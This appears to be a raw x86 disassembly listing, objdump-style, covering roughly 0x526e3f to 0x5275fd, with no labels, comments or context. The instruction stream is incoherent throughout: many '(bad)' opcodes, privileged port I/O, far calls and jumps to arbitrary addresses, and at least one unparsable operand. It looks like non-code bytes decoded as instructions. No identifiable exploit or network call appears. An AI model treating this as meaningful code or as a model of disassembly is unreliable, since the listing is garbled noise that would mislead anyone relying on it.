  526e3f:	xchg   BYTE PTR [ebp+0x2564a017],bl
  526e45:	push   ds
  526e46:	dec    edi
  526e47:	jl     0x526e87
  526e49:	ficom  DWORD PTR [ecx-0x61]
  526e4c:	(bad)  
  526e4d:	pusha  
  526e4e:	das    
  526e4f:	dec    esi
  526e50:	mov    eax,0x2681c7b0
  526e55:	inc    esp
  526e56:	hlt    
  526e57:	cld    
  526e58:	and    DWORD PTR [ecx-0x113909cf],0xffffffe3
  526e5f:	fwait
  526e60:	sbb    eax,DWORD PTR ds:0xa95d589f
  526e66:	cmovno ebp,DWORD PTR [edx-0x1987f7dd]
  526e6d:	int3   
  526e6e:	fisubr DWORD PTR [edx+0x495dd81d]
  526e74:	or     DWORD PTR [edx+edi*1-0x3f],edi
  526e78:	ss hlt 
  526e7a:	mov    ebp,eax
  526e7c:	mov    al,ds:0x6769f52c
  526e81:	jne    0x526e11
  526e83:	push   ss
  526e84:	out    dx,eax
  526e85:	jo     0x526e11
  526e87:	arpl   WORD PTR [ebx-0x25],bx
  526e8a:	add    BYTE PTR [eax+esi*4+0x3f66db1d],dl
  526e91:	rol    DWORD PTR [ebx+ecx*8+0x42],1
  526e95:	dec    edi
  526e96:	popa   
  526e97:	call   0x144:0xab78ac23
  526e9e:	aas    
  526e9f:	pop    esp
  526ea0:	xchg   DWORD PTR ds:0xe0fa8058,eax
  526ea6:	or     al,0xb7
  526ea8:	add    BYTE PTR [eax],ah
  526eaa:	(bad)  
  526eab:	out    dx,al
  526eac:	mov    bh,0x11
  526eae:	cmc    
  526eaf:	scas   eax,DWORD PTR es:[edi]
  526eb0:	push   edx
  526eb1:	test   DWORD PTR [edi],0x76c4bae5
  526eb7:	add    DWORD PTR [edi-0x48f386c6],esp
  526ebd:	mov    eax,DWORD PTR [ecx]
  526ebf:	jl     0x526eca
  526ec1:	inc    eax
  526ec2:	pop    ds
  526ec3:	cdq    
  526ec4:	fmul   st,st(7)
  526ec6:	arpl   cx,bx
  526ec8:	in     eax,0xfd
  526eca:	jecxz  0x526ebf
  526ecc:	repz mov cl,0xfe
  526ecf:	or     DWORD PTR [ebx+edi*8+0x1f8011f3],edi
  526ed6:	shl    DWORD PTR [ecx+0x41],0x2c
  526eda:	dec    esp
  526edb:	or     ebp,edi
  526edd:	pushf  
  526ede:	sub    al,0x23
  526ee0:	adc    bl,BYTE PTR [esi]
  526ee2:	test   eax,0x6c985de5
  526ee7:	push   ds
  526ee8:	adc    DWORD PTR ds:0xf6893182,0xffffffc7
  526eef:	xlat   BYTE PTR ds:[ebx]
  526ef0:	lds    eax,FWORD PTR [esi+0x329251ae]
  526ef6:	(bad)  
  526ef7:	cli    
  526ef8:	pop    edx
  526ef9:	bnd jbe 0x526f44
  526efc:	gs pop ds
  526efe:	sub    eax,0x4df59a12
  526f03:	or     bl,BYTE PTR [esi]
  526f05:	faddp  st(6),st
  526f07:	fcmovu st,st(1)
  526f09:	adc    BYTE PTR [edi],bh
  526f0b:	mov    ?,WORD PTR [ebx]
  526f0d:	cmc    
  526f0e:	or     eax,0xc4f8be5b
  526f13:	into   
  526f14:	sub    BYTE PTR [edi+ebx*1],0x21
  526f18:	pop    esi
  526f19:	dec    edx
  526f1a:	xor    ebx,DWORD PTR [ebp+0x32b3fc6]
  526f20:	in     eax,dx
  526f21:	and    DWORD PTR [eax-0x3fb2d03f],edx
  526f27:	es push ecx
  526f29:	dec    ecx
  526f2a:	fisttp WORD PTR [edx-0x3f]
  526f2d:	mov    ch,0xb9
  526f2f:	push   edi
  526f30:	and    DWORD PTR [eax+0x27],esp
  526f33:	sbb    bl,bh
  526f35:	nop
  526f36:	into   
  526f37:	es add al,0xfc
  526f3a:	pop    DWORD PTR ds:0xdad5eb8b
  526f40:	mov    ch,BYTE PTR [edx+0x65]
  526f43:	(bad)  
  526f44:	push   edi
  526f45:	into   
  526f46:	push   ss
  526f47:	add    ah,BYTE PTR [edx+0x53]
  526f4a:	aad    0x57
  526f4c:	inc    esp
  526f4d:	mov    ds:0x9c292bcc,al
  526f52:	push   ebp
  526f53:	sub    ecx,DWORD PTR [esi]
  526f55:	pusha  
  526f56:	mov    DWORD PTR [esi-0x6a],esi
  526f59:	fwait
  526f5a:	lea    ebx,[edi]
  526f5c:	xchg   edi,eax
  526f5d:	cs dec edi
  526f5f:	adc    BYTE PTR [ecx-0x39],0x10
  526f63:	je     0x526f27
  526f65:	mov    esi,esp
  526f67:	cs jo  0xe147b718
  526f6e:	dec    esi
  526f6f:	je     0x526fbc
  526f71:	mov    bl,dl
  526f73:	jae    0x526f9a
  526f75:	rcr    BYTE PTR [ecx],1
  526f77:	mov    al,0x76
  526f79:	jg     0x526f52
  526f7b:	or     al,0x63
  526f7d:	popa   
  526f7e:	jmp    0x526f6a
  526f80:	das    
  526f81:	or     ebx,DWORD PTR [edx]
  526f83:	cmp    eax,0x5adac1e2
  526f88:	js     0x526f50
  526f8a:	push   esi
  526f8b:	xor    ebp,edx
  526f8d:	xchg   ecx,eax
  526f8e:	inc    eax
  526f8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  526f90:	pop    ebx
  526f91:	sbb    esp,DWORD PTR [edx+0x5b88d4f9]
  526f97:	call   0xbcc1:0x2cb9fa23
  526f9e:	cmp    eax,0x3a5c276
  526fa3:	sbb    al,0xf7
  526fa5:	jl     0x526fd0
  526fa7:	and    DWORD PTR ds:0x9acc4832,esp
  526fad:	mov    cl,BYTE PTR [ecx-0x40e64556]
  526fb3:	or     eax,0xe0838903
  526fb8:	push   0x7f
  526fba:	or     eax,0x321f16b
  526fbf:	mov    al,ds:0x4948db6c
  526fc4:	lods   al,BYTE PTR ds:[esi]
  526fc5:	pop    esi
  526fc6:	int    0x14
  526fc8:	xchg   ebx,eax
  526fc9:	push   0xe66381a1
  526fce:	fs inc esp
  526fd0:	push   ebp
  526fd1:	or     ebp,esp
  526fd3:	inc    ebx
  526fd4:	cmp    ebp,DWORD PTR [eax]
  526fd6:	les    eax,FWORD PTR [ecx]
  526fd8:	push   0x60
  526fda:	pushf  
  526fdb:	ret    0x6c0
  526fde:	push   edx
  526fdf:	out    0x12,eax
  526fe1:	jbe    0x526ff3
  526fe3:	ins    DWORD PTR es:[edi],dx
  526fe4:	out    dx,eax
  526fe5:	add    eax,0x9a0777b4
  526fea:	cli    
  526feb:	shl    DWORD PTR [ebx-0x3c],1
  526fee:	repz dec esi
  526ff0:	jb     0x527041
  526ff2:	inc    ebp
  526ff3:	(bad)  
  526ff4:	std    
  526ff5:	(bad)  
  526ff6:	jge    0x52702a
  526ff8:	fild   WORD PTR [ebx+edx*4+0x7e]
  526ffc:	push   ss
  526ffd:	push   esp
  526ffe:	inc    esp
  526fff:	mov    eax,ds:0x503e6db8
  527004:	mov    BYTE PTR [eax-0x20e47568],al
  52700a:	popf   
  52700b:	(bad)  
  52700d:	imul   edx,DWORD PTR [edi],0xf6d70782
  527013:	fwait
  527014:	mov    ebx,0x883c74eb
  527019:	clc    
  52701a:	out    dx,al
  52701b:	add    DWORD PTR ds:0xb60a08a8,ecx
  527021:	js     0x52708b
  527023:	(bad)  
  527024:	hlt    
  527025:	pop    ss
  527026:	scas   al,BYTE PTR es:[edi]
  527027:	sbb    ebp,DWORD PTR [edx-0x17e99340]
  52702d:	mov    ah,0x45
  52702f:	cli    
  527030:	or     al,0xd0
  527032:	add    al,0xbc
  527034:	pop    eax
  527035:	fdiv   DWORD PTR [esi]
  527037:	shl    ebx,0xa4
  52703a:	arpl   WORD PTR [ecx-0x7644d2c0],ax
  527040:	xor    eax,0x2144c18
  527045:	adc    eax,0xf186b416
  52704a:	hlt    
  52704b:	fidivr DWORD PTR [ebx-0x67892582]
  527051:	inc    ecx
  527052:	sub    eax,0xd8c9f1d3
  527057:	sahf   
  527058:	add    ebx,eax
  52705a:	xchg   ebx,eax
  52705b:	stos   DWORD PTR es:[edi],eax
  52705c:	mov    edx,0x2712eb1e
  527061:	jb     0x52703a
  527063:	pushf  
  527064:	dec    esp
  527065:	mov    ebx,0x2b1c2485
  52706a:	aas    
  52706b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52706c:	xor    BYTE PTR [eax-0x75026bb1],bl
  527072:	nop
  527073:	dec    esi
  527074:	cmp    DWORD PTR [ecx+0x71],esp
  527077:	sub    DWORD PTR [edi-0x65f47417],ecx
  52707d:	es cmc 
  52707f:	push   esi
  527080:	xor    esp,DWORD PTR ds:0xd75a0d0a
  527086:	inc    ebx
  527087:	cs push edx
  527089:	mov    bl,0x32
  52708b:	push   es
  52708c:	outs   dx,DWORD PTR ds:[esi]
  52708d:	and    al,0x41
  52708f:	sbb    ch,dl
  527091:	sub    al,0x8
  527093:	sub    ebp,esi
  527095:	js     0x527031
  527097:	dec    ebx
  527098:	loope  0x527048
  52709a:	shr    DWORD PTR [edx],cl
  52709c:	bound  ebp,QWORD PTR [ecx+eax*4]
  52709f:	push   edi
  5270a0:	mov    bl,0xeb
  5270a2:	ins    BYTE PTR es:[edi],dx
  5270a3:	add    eax,0xf60f528a
  5270a8:	outs   dx,DWORD PTR ds:[esi]
  5270a9:	push   eax
  5270aa:	fwait
  5270ab:	mov    al,ds:0x454490b9
  5270b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5270b1:	cs push 0x65a5fca6
  5270b7:	mov    al,ds:0xc5cfaf81
  5270bc:	neg    DWORD PTR [ebx-0xe]
  5270bf:	dec    esi
  5270c0:	cmp    al,0x7a
  5270c2:	sbb    DWORD PTR [ecx-0x35],edx
  5270c5:	add    bp,WORD PTR [edi+edx*1-0x3e]
  5270ca:	jp     0x527058
  5270cc:	addr16 dec eax
  5270ce:	and    BYTE PTR [esp],ah
  5270d1:	retf   0xcee1
  5270d4:	fwait
  5270d5:	xor    al,0x49
  5270d7:	dec    ecx
  5270d8:	add    DWORD PTR [ebx+0x2955e7f7],ebx
  5270de:	ja     0x5270fb
  5270e0:	jmp    0xed8a0127
  5270e5:	mov    ebx,0x87e9e41f
  5270ea:	push   es
  5270eb:	enter  0x2531,0xfc
  5270ef:	sbb    esp,eax
  5270f1:	gs ret 
  5270f3:	stos   BYTE PTR es:[edi],al
  5270f4:	push   edx
  5270f5:	test   eax,0xc45919f1
  5270fa:	push   ebx
  5270fb:	pop    ebp
  5270fc:	add    bh,ch
  5270fe:	leave  
  5270ff:	aaa    
  527100:	fs (bad) 
  527102:	add    BYTE PTR [edx+0x28],al
  527105:	shl    BYTE PTR [edx],cl
  527107:	stc    
  527108:	fbld   TBYTE PTR [edx-0x73321a11]
  52710e:	xchg   edi,eax
  52710f:	call   0x79b8bb4b
  527114:	pop    edx
  527115:	jp     0x527103
  527117:	shl    BYTE PTR [edx+0x16],1
  52711a:	jge    0x5270f9
  52711c:	mov    dl,0x78
  52711e:	pop    edi
  52711f:	jne    0x52719c
  527121:	daa    
  527122:	popf   
  527123:	xchg   DWORD PTR ds:0x59681542,ebp
  527129:	out    0x7a,eax
  52712b:	xchg   esp,eax
  52712c:	pop    ecx
  52712d:	repnz pusha 
  52712f:	add    DWORD PTR [ecx],eax
  527131:	rcr    ebp,cl
  527133:	jge    0x527187
  527135:	cmp    ebx,DWORD PTR [edx-0x1479b511]
  52713b:	outs   dx,BYTE PTR ds:[esi]
  52713c:	(bad)
  52713f:	add    cl,BYTE PTR [edx+0x5e]
  527142:	(bad)  
  527143:	lock push 0xffffff91
  527146:	inc    edx
  527147:	sub    ebp,DWORD PTR [edx]
  527149:	add    al,BYTE PTR [ecx+0x279a56e9]
  52714f:	push   0x1b
  527151:	and    DWORD PTR [edi+0x5c],ebp
  527154:	stc    
  527155:	mov    al,ds:0x12344d49
  52715a:	cli    
  52715b:	iret   
  52715c:	pushf  
  52715d:	mov    edx,0x8d8a33a1
  527162:	fwait
  527163:	inc    eax
  527164:	push   cs
  527165:	xchg   ebx,eax
  527166:	lahf   
  527167:	jne    0x52713d
  527169:	call   0xdb5252a5
  52716e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52716f:	jp     0x527101
  527171:	scas   al,BYTE PTR es:[edi]
  527172:	push   0xad81e7f8
  527177:	xchg   edx,eax
  527178:	mov    ds:0x6dcdf140,al
  52717d:	jbe    0x5271e3
  52717f:	test   dh,dh
  527181:	push   esi
  527182:	inc    edx
  527183:	sahf   
  527184:	or     al,0x6d
  527186:	sub    BYTE PTR [ecx*1-0x60e26edd],0x90
  52718e:	sbb    edx,edi
  527190:	in     al,0x3b
  527192:	fisttp DWORD PTR [ebp+0x4c9a3e91]
  527198:	mov    ah,0x7b
  52719a:	mov    eax,eax
  52719c:	add    eax,0x0
  52719f:	jns    0x5271c9
  5271a1:	dec    bh
  5271a3:	je     0x527179
  5271a5:	lds    eax,FWORD PTR [ecx-0x26f1e0cf]
  5271ab:	nop
  5271ac:	vsubsd xmm2,xmm2,QWORD PTR [ebx+0x1e]
  5271b1:	push   ss
  5271b2:	imul   dh
  5271b4:	sbb    al,0x90
  5271b6:	arpl   WORD PTR [ebp+0x64594aad],di
  5271bc:	dec    ebx
  5271bd:	repz imul ebp,DWORD PTR [esi+0x12919059],0xb0500889
  5271c8:	out    0xc,eax
  5271ca:	sub    al,BYTE PTR fs:[esi]
  5271cd:	retf   
  5271ce:	jbe    0x5271e4
  5271d0:	and    bl,BYTE PTR [edi]
  5271d2:	xor    al,0xee
  5271d4:	add    al,0x5a
  5271d6:	test   bh,dl
  5271d8:	in     al,0xfc
  5271da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5271db:	pop    ds
  5271dc:	daa    
  5271dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  5271de:	nop
  5271df:	jecxz  0x5271fe
  5271e1:	mov    esi,0x71146426
  5271e7:	xlat   BYTE PTR ds:[ebx]
  5271e8:	pop    ds
  5271e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5271ea:	mov    dl,0x62
  5271ec:	mov    DWORD PTR [edx+eax*2],0x4c2433b2
  5271f3:	(bad)  
  5271f4:	cli    
  5271f5:	cmp    eax,0xabe94c21
  5271fa:	mov    eax,0xf622592f
  5271ff:	pop    ss
  527200:	aam    0x16
  527202:	imul   ebx,DWORD PTR [ecx+0xfebdaa7],0xffffff9c
  527209:	and    BYTE PTR [ecx],0xe1
  52720c:	aas    
  52720d:	jne    0x5271bd
  52720f:	cdq    
  527210:	xchg   edx,eax
  527211:	sub    DWORD PTR [ecx],ebx
  527213:	(bad)  [eax+0x60]
  527216:	hlt    
  527217:	adc    bh,BYTE PTR [ebx]
  527219:	add    BYTE PTR [ebp-0x51089d57],bh
  52721f:	cdq    
  527220:	popa   
  527221:	mov    bh,0x68
  527223:	mov    edx,0xaa8f8ab1
  527228:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  527229:	mov    bl,0xad
  52722b:	mov    DWORD PTR [edi],edx
  52722d:	mov    ds:0x91e466f7,eax
  527232:	xlat   BYTE PTR ds:[ebx]
  527233:	xor    DWORD PTR [edx+0x3b55dc16],ecx
  527239:	inc    eax
  52723a:	add    edx,DWORD PTR [ebp-0x70]
  52723d:	xchg   edx,eax
  52723e:	jl     0x5271f1
  527240:	and    BYTE PTR [ebx+0x5943728e],cl
  527246:	mov    BYTE PTR [edx+esi*2],bh
  527249:	scas   al,BYTE PTR es:[edi]
  52724a:	or     DWORD PTR [ecx+esi*4+0x6d],edx
  52724e:	sbb    eax,0xfe2ee22
  527253:	sub    esp,DWORD PTR [eax-0x47]
  527256:	sub    DWORD PTR es:[edi],ebx
  527259:	mov    ds:0xf7874239,al
  52725e:	aas    
  52725f:	ja     0x52724e
  527261:	mov    ecx,0x23f3c0af
  527266:	cmp    BYTE PTR [ebx],ah
  527268:	lahf   
  527269:	icebp  
  52726a:	(bad)  
  52726b:	xlat   BYTE PTR ds:[ebx]
  52726c:	int3   
  52726d:	and    cl,ch
  52726f:	inc    ecx
  527270:	add    esi,DWORD PTR [edx+eax*8-0x25]
  527274:	stos   DWORD PTR es:[edi],eax
  527275:	hlt    
  527276:	adc    al,0x42
  527278:	xchg   edi,eax
  527279:	cmp    BYTE PTR ss:[edx+0x37dc0cb7],dh
  527280:	xor    edi,edi
  527282:	outs   dx,BYTE PTR ds:[esi]
  527283:	outs   dx,BYTE PTR ds:[esi]
  527284:	push   edx
  527285:	leave  
  527286:	push   0xffffffe0
  527288:	dec    esp
  527289:	dec    edx
  52728a:	xchg   DWORD PTR [edx+ebx*2],esi
  52728d:	add    edi,DWORD PTR [edi+0xa1108eb]
  527293:	adc    al,0x77
  527295:	popa   
  527296:	fld    TBYTE PTR [eax+0x34534dc6]
  52729c:	rcl    eax,1
  52729e:	(bad)  
  5272a0:	enter  0x815,0x77
  5272a4:	call   0x9ce9:0x4b4f249e
  5272ab:	xchg   DWORD PTR [eax+eiz*1+0x43],ebx
  5272af:	stos   BYTE PTR es:[edi],al
  5272b0:	(bad)  
  5272b1:	pop    edx
  5272b2:	mov    ebx,0xe13a71d4
  5272b7:	fwait
  5272b8:	dec    ebx
  5272b9:	dec    ecx
  5272ba:	xor    eax,0xd55e3ee5
  5272bf:	inc    esi
  5272c0:	ret    0x4ceb
  5272c3:	(bad)  
  5272c5:	push   edi
  5272c6:	mov    ds:0x22f7ed70,eax
  5272cb:	pop    es
  5272cc:	jmp    0xd651ffd6
  5272d1:	popa   
  5272d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  5272d3:	test   DWORD PTR [ebx-0x25],ebx
  5272d6:	inc    ebp
  5272d7:	mov    edx,0x90ea932b
  5272dc:	cld    
  5272dd:	iret   
  5272de:	pop    ss
  5272df:	pusha  
  5272e0:	push   0x7f
  5272e2:	iret   
  5272e3:	xchg   edi,eax
  5272e4:	or     eax,0x36bc15c2
  5272e9:	loop   0x52726d
  5272eb:	xchg   ecx,eax
  5272ec:	mov    dh,0x58
  5272ee:	add    al,0x72
  5272f0:	xchg   esp,eax
  5272f1:	dec    ecx
  5272f2:	pop    ecx
  5272f3:	(bad)  
  5272f4:	in     al,dx
  5272f5:	stc    
  5272f6:	in     eax,0x23
  5272f8:	push   0xfe5dfa73
  5272fd:	sti    
  5272fe:	call   0xfa4b399d
  527303:	loopne 0x52730f
  527305:	ins    BYTE PTR es:[edi],dx
  527306:	dec    edx
  527307:	or     ecx,edx
  527309:	or     ebx,DWORD PTR [ecx-0x21]
  52730c:	or     esi,DWORD PTR [eax]
  52730e:	and    esi,DWORD PTR [ecx+ebx*4+0x6d]
  527312:	mov    eax,ds:0xb360f17f
  527317:	andnps xmm2,XMMWORD PTR [ebx-0x4f]
  52731b:	sar    BYTE PTR [edi],cl
  52731d:	lds    ebx,FWORD PTR [ebx]
  52731f:	test   ch,0x4f
  527322:	xchg   cl,bh
  527324:	inc    edi
  527325:	jb     0x52730b
  527327:	fwait
  527328:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  527329:	mov    edi,0x9be42307
  52732e:	call   0xf1572000
  527333:	push   ebp
  527334:	sbb    eax,ecx
  527336:	int    0x5e
  527338:	and    DWORD PTR [esi+0x78],ecx
  52733b:	mov    DWORD PTR [edx-0xc],ebp
  52733e:	in     al,dx
  52733f:	outs   dx,BYTE PTR ds:[esi]
  527340:	mov    es,WORD PTR [edi+0x2fddd1bf]
  527346:	popa   
  527347:	gs (bad) 
  527349:	daa    
  52734a:	and    DWORD PTR [esi+0x44],edi
  52734d:	xor    bl,BYTE PTR [esi+0x79]
  527350:	sub    eax,0x95b56372
  527356:	or     ecx,esi
  527358:	stos   DWORD PTR es:[edi],eax
  527359:	fbld   TBYTE PTR [eax+0x3698a5d1]
  52735f:	xlat   BYTE PTR ds:[ebx]
  527360:	dec    eax
  527361:	and    BYTE PTR [eax-0x65],ah
  527364:	je     0x527311
  527366:	leave  
  527367:	push   edx
  527368:	lock mov ecx,0x8a8bb58e
  52736e:	ss inc edi
  527370:	sub    eax,0x5c6a7ed9
  527375:	ret    0xd0d2
  527378:	mov    dl,0x9c
  52737a:	aam    0x55
  52737c:	stos   DWORD PTR es:[edi],eax
  52737d:	mov    ebp,0xd628c8ff
  527382:	mov    edi,0xbcb44337
  527387:	push   ecx
  527388:	mov    ecx,0x62aa9128
  52738d:	sbb    eax,0x42
  527390:	mov    bl,0x71
  527392:	out    0xb,eax
  527394:	mov    cl,0xb8
  527396:	jmp    0xb502f0d9
  52739b:	xor    eax,0xa70a400a
  5273a0:	retf   0x48a7
  5273a3:	mov    ds:0xf6a648f2,eax
  5273a8:	push   ecx
  5273a9:	mov    ds:0x421a3ad7,eax
  5273ae:	mov    eax,0xe6f3577
  5273b3:	lahf   
  5273b4:	xchg   ebx,eax
  5273b5:	dec    edi
  5273b6:	sbb    eax,0x2873a8bb
  5273bb:	pop    ebx
  5273bc:	ins    BYTE PTR es:[edi],dx
  5273bd:	outs   dx,DWORD PTR ds:[esi]
  5273be:	sub    edx,edi
  5273c0:	inc    edx
  5273c1:	int3   
  5273c2:	test   al,0x59
  5273c4:	sub    al,0x60
  5273c6:	out    dx,eax
  5273c7:	dec    esp
  5273c8:	cli    
  5273c9:	xchg   esi,eax
  5273ca:	jl     0x5273ee
  5273cc:	pop    eax
  5273cd:	je     0x527426
  5273cf:	jae    0x5273a8
  5273d1:	xlat   BYTE PTR ds:[ebx]
  5273d2:	dec    edx
  5273d3:	xchg   edi,eax
  5273d4:	pushf  
  5273d5:	push   ss
  5273d6:	in     al,dx
  5273d7:	jo     0x527457
  5273d9:	ds in  eax,dx
  5273db:	cmc    
  5273dc:	loop   0x5273f6
  5273de:	in     eax,0x7d
  5273e0:	aam    0x5
  5273e2:	loope  0x5273bf
  5273e4:	in     eax,dx
  5273e5:	add    al,0xb4
  5273e7:	lds    esi,FWORD PTR [ebx+ecx*8-0x70]
  5273eb:	inc    eax
  5273ec:	or     DWORD PTR [ecx+0x2a6f226f],esp
  5273f2:	retf   
  5273f3:	cmp    dh,al
  5273f5:	cmp    eax,0x10f7e390
  5273fa:	out    0x64,eax
  5273fc:	sub    cl,al
  5273fe:	out    0xe9,al
  527400:	ds (bad) 
  527402:	cmp    BYTE PTR [eax+0x7286390c],ah
  527408:	(bad)  
  527409:	xor    ecx,edi
  52740b:	iret   
  52740c:	xchg   BYTE PTR [ecx+0x3e],bh
  52740f:	adc    BYTE PTR [ebx+edi*8],0x24
  527413:	sti    
  527414:	pop    ecx
  527415:	sub    edi,esp
  527417:	xchg   ebp,eax
  527418:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  527419:	call   0xadc2f0c7
  52741e:	dec    ebp
  52741f:	cmp    bl,dh
  527421:	arpl   WORD PTR [eax],bp
  527423:	loop   0x52741b
  527425:	adc    al,0xea
  527427:	dec    esp
  527428:	loope  0x527484
  52742a:	in     eax,0xfd
  52742c:	(bad)  
  52742e:	jmp    0x5273f6
  527430:	push   ds
  527431:	(bad)  
  527432:	out    dx,eax
  527433:	sbb    dh,BYTE PTR ds:0x8d5dc57d
  527439:	out    dx,eax
  52743a:	cld    
  52743b:	and    BYTE PTR [ecx],al
  52743d:	jmp    0x4c8017ca
  527442:	push   0x3d891da1
  527447:	push   0x84aaab35
  52744c:	jmp    0x9bed:0xb79711b4
  527453:	out    0x4a,eax
  527455:	add    al,0x3f
  527457:	call   0xbdd0:0x8cdc67a7
  52745e:	cli    
  52745f:	les    esp,FWORD PTR [edx]
  527461:	(bad)  
  527462:	jge    0x5274cb
  527464:	stos   BYTE PTR es:[edi],al
  527465:	rcl    BYTE PTR [ebx-0x58c94b20],1
  52746b:	ror    BYTE PTR es:[eax],1
  52746e:	(bad)  
  52746f:	(bad)  [ebx]
  527471:	mov    es,WORD PTR [eax-0x30afc9b4]
  527477:	mov    dl,0x1d
  527479:	and    al,0xdc
  52747b:	sub    esi,ecx
  52747d:	sar    ah,1
  52747f:	and    al,0x73
  527481:	adc    bh,BYTE PTR [ecx-0x7992b7c6]
  527487:	push   ds
  527488:	mov    ds:0x22a836f4,al
  52748d:	mov    bl,0x18
  52748f:	xor    eax,esi
  527491:	loop   0x5274d8
  527493:	inc    edi
  527494:	fdivr  DWORD PTR [edi+0x27]
  527497:	pop    edx
  527498:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  527499:	test   eax,0xd64ecc7d
  52749e:	add    DWORD PTR [eax+0x1],edx
  5274a1:	xchg   edi,eax
  5274a2:	int    0x5a
  5274a4:	add    DWORD PTR [eax+0x2f96c8e9],ebp
  5274aa:	ss enter 0x700f,0x36
  5274af:	es jl  0x527448
  5274b2:	mov    eax,0x6e6c14d5
  5274b7:	out    0x9c,eax
  5274b9:	or     eax,0x8cce0e46
  5274be:	leave  
  5274bf:	mov    ecx,esi
  5274c1:	and    BYTE PTR [edx+0x20],0x4
  5274c5:	or     dl,BYTE PTR [ebp-0x59]
  5274c8:	js     0x527480
  5274ca:	test   BYTE PTR [edx+0x9bd74a3],ah
  5274d0:	inc    edx
  5274d1:	sbb    BYTE PTR [eax+0x3d1c7167],ah
  5274d7:	push   ds
  5274d8:	ss mov ebx,0x23fb7b7c
  5274de:	xor    BYTE PTR [esi+eax*2],al
  5274e1:	(bad)  
  5274e2:	dec    ebp
  5274e3:	mov    ebp,0x7ad6fe99
  5274e8:	sbb    ecx,DWORD PTR [ecx+0x7abd4912]
  5274ee:	outs   dx,DWORD PTR ds:[esi]
  5274ef:	inc    esi
  5274f0:	int3   
  5274f1:	pop    esi
  5274f2:	xchg   edx,eax
  5274f3:	mov    dl,0x3e
  5274f5:	ja     0x5274e8
  5274f7:	enter  0x8a5e,0xc8
  5274fb:	jo     0x527533
  5274fd:	jmp    0x89264219
  527502:	lock (bad) 
  527504:	sbb    ch,cl
  527506:	xor    esi,DWORD PTR [edx-0x56]
  527509:	dec    ebp
  52750a:	cmc    
  52750b:	rcr    DWORD PTR [esi+0x43634003],1
  527511:	pusha  
  527512:	(bad)  
  527514:	mov    ebx,0x7a74e60b
  527519:	scas   al,BYTE PTR es:[edi]
  52751a:	xchg   esp,eax
  52751b:	mov    ds:0x639820be,al
  527520:	cmp    eax,0x4ac92eb1
  527525:	jecxz  0x5274ec
  527527:	imul   ecx,DWORD PTR [edx-0x782e3bf9],0xffffff92
  52752e:	aaa    
  52752f:	push   es
  527530:	inc    ecx
  527531:	mov    ah,0xde
  527533:	dec    esi
  527534:	outs   dx,BYTE PTR ds:[esi]
  527535:	out    dx,eax
  527536:	and    DWORD PTR [esi+eax*1+0x4b],esi
  52753a:	push   0x23bf7a9c
  52753f:	adc    eax,0xcc794417
  527544:	or     edi,DWORD PTR [ebp+esi*1-0x80]
  527548:	dec    ecx
  527549:	adc    BYTE PTR [edi-0x2d],dh
  52754c:	call   DWORD PTR [edi+0x1d]
  52754f:	retf   0xe9ec
  527552:	outs   dx,DWORD PTR ds:[esi]
  527553:	cmc    
  527554:	sub    BYTE PTR [edi-0x3c],0x60
  527558:	xchg   esp,eax
  527559:	aam    0x73
  52755b:	push   ecx
  52755c:	xor    eax,ebp
  52755e:	mov    esi,0x76cddf63
  527563:	bound  eax,QWORD PTR [edi+0x51]
  527566:	mov    al,ds:0x9be64b7b
  52756b:	pop    ss
  52756c:	sub    BYTE PTR [ebx],0x2b
  52756f:	inc    ebp
  527570:	test   BYTE PTR [eax],dh
  527572:	xor    esp,DWORD PTR [ebx+0x3a]
  527575:	sbb    eax,0x1f6c98e3
  52757a:	ret    0x7121
  52757d:	in     al,dx
  52757e:	sub    ch,BYTE PTR [ecx+0x356ac971]
  527584:	jle    0x5275df
  527586:	cli    
  527587:	retf   
  527588:	mov    ds:0x2da57069,al
  52758d:	std    
  52758e:	rcl    ebx,0x85
  527591:	sbb    eax,0xad03c47d
  527596:	push   0x6d6b9ca7
  52759b:	and    BYTE PTR [eax+0x47],bl
  52759e:	or     al,BYTE PTR [ecx-0x3242dc2f]
  5275a4:	inc    ecx
  5275a5:	push   edi
  5275a6:	sub    BYTE PTR [eax],bl
  5275a8:	inc    ebx
  5275a9:	aas    
  5275aa:	pop    ebx
  5275ab:	mov    ebp,0x33820a90
  5275b0:	xchg   esp,eax
  5275b1:	xchg   esp,eax
  5275b2:	fsub   DWORD PTR [ebx-0x19]
  5275b5:	je     0x5275c7
  5275b7:	sbb    al,0x84
  5275b9:	inc    eax
  5275ba:	jp     0x527595
  5275bc:	mov    esi,0xce7987d0
  5275c1:	mov    dh,0x29
  5275c3:	xor    ah,ch
  5275c5:	pop    ss
  5275c6:	cmp    BYTE PTR [ebx],cl
  5275c8:	pop    ebx
  5275c9:	pop    ecx
  5275ca:	aaa    
  5275cb:	lods   al,BYTE PTR ds:[esi]
  5275cc:	std    
  5275cd:	push   ebx
  5275ce:	sbb    al,0x6e
  5275d0:	mov    ds:0xc527906a,al
  5275d5:	ds dec ebx
  5275d7:	xchg   esp,eax
  5275d8:	(bad)  
  5275d9:	jae    0x5275cb
  5275db:	push   ebp
  5275dc:	nop
  5275dd:	fild   QWORD PTR [ebp-0x72]
  5275e0:	add    dh,cl
  5275e2:	xchg   esi,eax
  5275e3:	cmp    ebx,esi
  5275e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  5275e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  5275e7:	mov    ch,0x28
  5275e9:	shr    BYTE PTR [ecx-0x3],0xae
  5275ed:	xor    dh,al
  5275ef:	mov    bl,0x69
  5275f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  5275f2:	jmp    DWORD PTR [esi-0x2a]
  5275f5:	inc    esp
  5275f6:	or     edx,DWORD PTR [ecx]
  5275f8:	add    dh,bh
  5275fa:	add    edi,DWORD PTR [ebx-0x17]
  5275fd:	and    ebx,DWORD PTR [esi]
